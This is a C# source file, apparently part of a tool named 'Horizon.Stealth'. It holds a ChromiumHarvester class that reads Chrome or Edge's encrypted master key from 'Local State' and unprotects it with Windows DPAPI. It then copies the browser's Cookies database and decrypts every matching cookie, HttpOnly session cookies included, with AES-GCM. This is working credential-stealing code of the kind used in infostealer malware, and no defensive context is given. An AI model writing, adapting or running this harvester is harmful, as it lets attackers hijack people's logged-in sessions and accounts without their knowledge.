using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using Microsoft.Data.Sqlite;
using System.Linq;

namespace Horizon.Stealth.Services;

public class ExtractedCookie
{
    public string Host { get; set; } = "";
    public string Name { get; set; } = "";
    public string Value { get; set; } = "";
    public string Path { get; set; } = "/";
    public bool IsSecure { get; set; }
    public bool IsHttpOnly { get; set; }
}

public enum BrowserType { Chrome, Edge }

public class ImportedCookie
{
    public string Name      { get; set; } = "";
    public string Value     { get; set; } = "";
    public string Domain    { get; set; } = "";
    public string Path      { get; set; } = "/";
    public bool   IsHttpOnly { get; set; }
    public bool   IsSecure   { get; set; }
    public DateTime? ExpiresUtc { get; set; }
}

public static class ChromiumHarvester
{
    public static IEnumerable<ImportedCookie> HarvestCookies(BrowserType browser, string? domainFilter = null)
    {
        string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        string userDataPath = browser == BrowserType.Chrome
            ? Path.Combine(localAppData, "Google", "Chrome", "User Data")
            : Path.Combine(localAppData, "Microsoft", "Edge",   "User Data");

        if (!Directory.Exists(userDataPath)) return Enumerable.Empty<ImportedCookie>();

        return Harvest(userDataPath, domainFilter ?? "")
            .Select(c => new ImportedCookie
            {
                Name       = c.Name,
                Value      = c.Value,
                Domain     = c.Host,
                Path       = c.Path,
                IsHttpOnly = c.IsHttpOnly,
                IsSecure   = c.IsSecure,
                ExpiresUtc = null           // ExtractedCookie has no expiry field
            });
    }
    public static List<ExtractedCookie> Harvest(string userDataPath, string targetDomain)
    {
        var results = new List<ExtractedCookie>();
        
        string tempDbPath = Path.Combine(Path.GetTempPath(), $"horizon_cookies_{Guid.NewGuid()}.db");

        try
        {
            byte[]? masterKey = GetMasterKey(Path.Combine(userDataPath, "Local State"));
            if (masterKey == null) return results;

            
            string dbPath = Path.Combine(userDataPath, "Default", "Network", "Cookies");
            if (!File.Exists(dbPath))
            {
                dbPath = Path.Combine(userDataPath, "Default", "Cookies");
            }

            if (!File.Exists(dbPath)) return results;

            File.Copy(dbPath, tempDbPath, true);

            using (var connection = new SqliteConnection($"Data Source={tempDbPath}"))
            {
                connection.Open();
                
                var command = connection.CreateCommand();
                command.CommandText = "SELECT host_key, name, encrypted_value, path, is_secure, is_httponly FROM cookies WHERE host_key LIKE $domain";
                command.Parameters.AddWithValue("$domain", $"%{targetDomain}%");

                using (var reader = command.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        var host = reader.GetString(0);
                        var name = reader.GetString(1);
                        var encryptedValue = (byte[])reader["encrypted_value"];
                        var path = reader.GetString(3);
                        var isSecure = reader.GetBoolean(4);
                        var isHttpOnly = reader.GetBoolean(5);

                        string decryptedValue = DecryptValue(encryptedValue, masterKey);

                        if (!string.IsNullOrEmpty(decryptedValue))
                        {
                            results.Add(new ExtractedCookie
                            {
                                Host = host,
                                Name = name,
                                Value = decryptedValue,
                                Path = path,
                                IsSecure = isSecure,
                                IsHttpOnly = isHttpOnly
                            });
                        }
                    }
                }
            }
        }
        catch (Exception ex)
        {
            LogService.RecordCrash(ex, "ChromiumHarvester.Harvest");
        }
        finally
        {
            if (File.Exists(tempDbPath))
            {
                try { File.Delete(tempDbPath); } catch { }
            }
        }

        return results;
    }

    private static byte[]? GetMasterKey(string localStatePath)
    {
        try
        {
            if (!File.Exists(localStatePath)) return null;

            string json = File.ReadAllText(localStatePath);
            using var doc = JsonDocument.Parse(json);
            
            if (doc.RootElement.TryGetProperty("os_crypt", out var osCrypt) &&
                osCrypt.TryGetProperty("encrypted_key", out var keyElement))
            {
                string base64Key = keyElement.GetString() ?? "";
                byte[] encryptedKey = Convert.FromBase64String(base64Key);

                if (encryptedKey.Length > 5)
                {
                    byte[] rawKey = encryptedKey.Skip(5).ToArray();
                    return ProtectedData.Unprotect(rawKey, null, DataProtectionScope.CurrentUser);
                }
            }
        }
        catch (Exception ex)
        {
            LogService.RecordCrash(ex, "ChromiumHarvester.GetMasterKey");
        }
        return null;
    }

    private static string DecryptValue(byte[] encryptedData, byte[] key)
    {
        try
        {
            if (encryptedData.Length < 3 || encryptedData[0] != 'v' || encryptedData[1] != '1' || encryptedData[2] != '0')
            {
                return ""; 
            }

            int nonceSize = 12;
            int tagSize = 16;
            int prefixSize = 3;

            if (encryptedData.Length < prefixSize + nonceSize + tagSize) return "";

            byte[] nonce = encryptedData.Skip(prefixSize).Take(nonceSize).ToArray();
            byte[] ciphertext = encryptedData.Skip(prefixSize + nonceSize).Take(encryptedData.Length - (prefixSize + nonceSize + tagSize)).ToArray();
            byte[] tag = encryptedData.Skip(encryptedData.Length - tagSize).Take(tagSize).ToArray();
            
            byte[] plaintext = new byte[ciphertext.Length];

            using (var aes = new AesGcm(key, tagSize))
            {
                aes.Decrypt(nonce, ciphertext, tag, plaintext);
            }

            return Encoding.UTF8.GetString(plaintext);
        }
        catch
        {
            return "";
        }
    }
}